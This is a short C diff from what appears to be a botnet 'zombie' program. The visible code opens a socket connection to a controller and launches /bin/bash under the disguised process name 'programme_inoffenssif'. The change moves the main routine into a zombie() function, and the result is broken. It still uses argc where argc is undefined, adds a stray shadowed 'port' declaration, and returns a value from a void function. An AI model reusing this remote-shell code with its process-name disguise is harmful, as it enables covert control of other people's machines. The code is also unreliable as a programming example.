@@ -18,15 +18,15 @@
         sclose(*sockfd);
         sexecl("/bin/bash", "programme_inoffenssif", NULL);
     }
+    char port;
 
-    int main(int argc, char *argv[]){
-
+    void zombie(char* portRecu){
         int sockfd;
         int port;
         if(argc<2){
             sockfd = initSocketZombie(0);
         }else{
-            port = atoi(argv[1]);
+            port = atoi(portRecu);
             sockfd = initSocketZombie(port);
         }
         int i = 0;
@@ -50,5 +50,11 @@
 
         free(sockfdController);
         
+        return 0;
+
+    }
+
+    int main(int argc, char *argv[]){
+        zombie(argv[1]);
         return 0;
     }
